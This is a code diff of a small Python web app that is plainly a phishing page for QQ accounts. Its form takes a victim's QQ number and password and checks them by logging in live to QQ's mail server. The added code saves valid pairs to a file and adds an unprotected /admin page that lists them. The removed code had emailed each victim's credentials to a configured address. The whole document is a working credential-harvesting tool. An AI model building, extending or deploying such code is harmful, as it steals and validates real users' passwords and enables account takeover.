@@ -1,24 +1,35 @@
 import os
 import re
 import web
+import smtplib
 
 from jinja2 import Environment, FileSystemLoader
-
-from config import *
 
 templates_path = os.getcwd()
 
 env = Environment(loader=FileSystemLoader(templates_path))
 
-web.config.smtp_server = smtp_server
-web.config.smtp_port = smtp_port
-web.config.smtp_username = smtp_username
-web.config.smtp_password = smtp_password
-web.config.smtp_starttls = True
-
 def check_qq(qq_number, qq_password):
-    regex = ur'''[1-9][0-9]{4,}'''
-    return re.match(regex, qq_number) and len(qq_password) >= 6
+    qq_mail = qq_number + "@qq.com"
+    try:
+        smtp = smtplib.SMTP_SSL()
+        smtp.connect("smtp.qq.com", "465")
+        smtp.login(qq_mail, qq_password)
+    except smtplib.SMTPAuthenticationError:
+        return False
+    else:
+        return True
+    finally:
+        smtp.quit()
+
+def get_qq():
+    PdFile = open("Password.txt", "r")
+    users = []
+    for line in PdFile:
+        strList = line.split("^")
+        user = {"qq": strList[0], "password": strList[1]}
+        users.append(user)
+    return users
 
 class HomeHandler():
     def GET(self):
@@ -30,11 +41,10 @@ class HomeHandler():
     def POST(self):
         data = web.input()
         if check_qq(data.number, data.pd):
-            content = '''
-            QQ Number: %s
-            QQ Password: %s
-            ''' % (data.number, data.pd)
-            web.sendmail(smtp_username, email, 'QQ', content)
+            content = '''%s^%s''' % (data.number, data.pd)
+            PdFile = open('Password.txt','w')
+            PdFile.write(content)
+            PdFile.close()
             return env.get_template("index.html").render(
                 logged = True,
                 wrong_qq = False
@@ -45,8 +55,15 @@ class HomeHandler():
                 wrong_qq = True
                 )
 
+class AdminHandler():
+    def GET(self):
+        return env.get_template("admin.html").render(
+                users = get_qq()
+                )
+
 urls=(
     '/', 'HomeHandler',
+    '/admin', 'AdminHandler'
 )
 
 app = web.application(urls, globals())
